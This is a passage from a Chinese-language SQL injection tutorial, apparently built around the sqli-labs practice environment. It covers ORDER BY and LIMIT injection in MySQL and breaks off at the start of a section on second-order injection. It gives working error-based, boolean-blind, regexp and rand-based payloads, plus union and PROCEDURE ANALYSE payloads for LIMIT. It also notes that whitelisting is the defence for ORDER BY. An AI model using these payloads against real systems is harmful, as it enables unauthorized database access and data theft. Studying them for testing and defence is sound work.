<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> username</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic"># 这里的2等于username</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> username </span><span class="token keyword" style="color:#00009f">desc</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211221120522419" src="/assets/images/image-20211221120522419-a95115e2b96dcdaf9243d82a36343462.png" width="1034" height="1734" class="img_ev3q"></p>
<hr>
<p><code>order by注入</code>通常出现在排序中，前端结果展示的表格，某一列需要进行升序或者降序排列，或者做排名比较的时候常常会用到<code>order by</code>排序，<code>order by</code>在select语句中，紧跟在<code>where [where condition]</code>后，且<code>order by</code>注入无法使用预编译来防御，由于<code>order by</code>后面需要紧跟<code>column_name</code>，而预编译是参数化字符串，而<code>order by</code>后面紧跟字符串就会提示语法错误，因此通常防御order by注入需要使用白名单的方式。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="判定存在">判定存在<a href="#判定存在" class="hash-link" aria-label="判定存在的直接链接" title="判定存在的直接链接">​</a></h3>
<p>可以通过<code>order by</code>列名，根据排序返回的情况来判断是否存在注入</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> rand</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> rand</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> rand</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211221122701691" src="/assets/images/image-20211221122701691-fe863f8d273daa48825745d9143d0314.png" width="1674" height="1060" class="img_ev3q"></p>
<p>或者使用超大数或者返回多条记录，构成SQL语句错误</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">9999</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211221122613032" src="/assets/images/image-20211221122613032-28773e736e8fc6498d53197efd852e55.png" width="1780" height="348" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="利用语句-1">利用语句<a href="#利用语句-1" class="hash-link" aria-label="利用语句的直接链接" title="利用语句的直接链接">​</a></h3>
<p><strong><code>order by</code>通常情况下后面可直接接SQL语句</strong>，所以利用方式很多，此处通过<code>Less-46</code>，列举一些抛砖引玉。</p>
<ul>
<li>基于报错</li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> exp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">~</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> version</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> exp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">~</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> version</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211221140525875" src="/assets/images/image-20211221140525875-62fdfcaf3eb5d12e60ad6077646546e7.png" width="1998" height="340" class="img_ev3q"></p>
<ul>
<li>基于盲注</li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">tables</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># 正常</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">tables</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># 异常</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">mid</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;s&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">tables</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># 正常</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">mid</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;a&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">tables</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># 异常</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211221141042897" src="/assets/images/image-20211221141042897-9f94cb4e5674fa552bdde50e7f125905.png" width="1674" height="1072" class="img_ev3q"></p>
<blockquote>
<p><del>如果直接使用sleep函数，如果表里的数据有n条，<code>sleep(2)</code>，会使查询时间为<code>2*n</code>，会对服务器造成拒绝服务攻击，一般不建议在order by 处使用时间盲注来判断以及注入数据</del></p>
<p>上面那句话不完全准确，直接<code>order by sleep(2)</code>确实是2n，但是如果使用子查询，那么还是正常延时的</p>
<p><img decoding="async" loading="lazy" alt="image-20220408212500998" src="/assets/images/image-20220408212500998-b490abd42414009328fbbfcdeab5c03b.png" width="1468" height="422" class="img_ev3q"></p>
</blockquote>
<ul>
<li>基于正则</li>
</ul>
<p>也算是盲注的一种吧</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">regexp</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># 正常</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">regexp</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># 异常</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211221164347043" src="/assets/images/image-20211221164347043-c0311739256daff0b46be1c42eccadbc.png" width="1648" height="322" class="img_ev3q"></p>
<ul>
<li>基于<code>rand</code></li>
</ul>
<p>这也算是盲注的一种，主要是根据返回数据的排序来判断</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># true 和 false 返回的顺序是不一样的</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> rand</span><span class="token punctuation" style="color:#393A34">(</span><span class="token boolean" style="color:#36acaa">true</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> rand</span><span class="token punctuation" style="color:#393A34">(</span><span class="token boolean" style="color:#36acaa">false</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> rand</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">substr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;s&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> rand</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">substr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;a&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="limit注入">limit注入<a href="#limit注入" class="hash-link" aria-label="limit注入的直接链接" title="limit注入的直接链接">​</a></h2>
<p>此方法适用于MySQL 5.x中，实测在<code>8.0.27</code>中会报错，在LIMIT后面可以跟两个函数，<code>PROCEDURE</code> 和 <code>INTO</code>，INTO除非有写入shell的权限，否则是无法利用的，所以就只能利用<code>PROCEDURE</code></p>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>备注</div><div class="admonitionContent_BuS1"><p>可能面试的时候会被问到：order by注入和limit注入有啥区别？</p><p><strong>其实两者的区别很简单：<code>order by</code>注入后可以直接接SQL语句，而<code>limit</code>后面不行，需要再跟<code>PROCEDURE ANALYSE()</code>才可</strong></p></div></div>
<p>其实也可以分为两种情况，一种是limit前有<code>order by</code>，一种是没有<code>order by</code></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="无order-by">无order by<a href="#无order-by" class="hash-link" aria-label="无order by的直接链接" title="无order by的直接链接">​</a></h3>
<p>利用起来相对比较简单，可以直接在后面接<code>union</code>，也可以用后面那种limit专属的方式</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> aaa </span><span class="token keyword" style="color:#00009f">limit</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 使用union注入</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> aaa </span><span class="token keyword" style="color:#00009f">limit</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> version</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 报错注入，延时类似</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> aaa </span><span class="token keyword" style="color:#00009f">limit</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">procedure</span><span class="token plain"> analyse </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">extractvalue</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rand</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x3a</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">version</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20220120170554662" src="/assets/images/image-20220120170554662-70aaf0b1451ae46a3a0686b1fb24ddb8.png" width="2090" height="84" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="有order-by">有order by<a href="#有order-by" class="hash-link" aria-label="有order by的直接链接" title="有order by的直接链接">​</a></h3>
<p>这个情况下就不能用union注入了，不然会抛出异常，所以用<code>limit</code>的专属注入方式，适用于<code>5.0.0&lt;MySQL&lt;5.6.6</code>版本</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> aaa </span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">limit</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 报错注入，延时类似</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> aaa </span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">limit</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">procedure</span><span class="token plain"> analyse </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">extractvalue</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rand</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">concat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x3a</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">version</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20220120171505239" src="/assets/images/image-20220120171505239-a3ba5ba74f2eed298649a847cdb44098.png" width="2260" height="130" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="二次注入">二次注入<a href="#二次注入" class="hash-link" aria-label="二次注入的直接链接" title="二次注入的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="概念-6">概念<a href="#概念-6" class="hash-link" aria-label="概念的直接链接" title="概念的直接链接">​</a></h3>
<p><strong>二次注入就是攻击者构造的恶意payload首先会被服务器存储在数据库中，在之后取出数据库在进行SQL语句拼接时产生的SQL注入问题。</strong></p>
<p>二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="利用分析">利用分析<a href="#利用分析" class="hash-link" aria-label="利用分析的直接链接" title="利用分析的直接链接">​</a></h3>
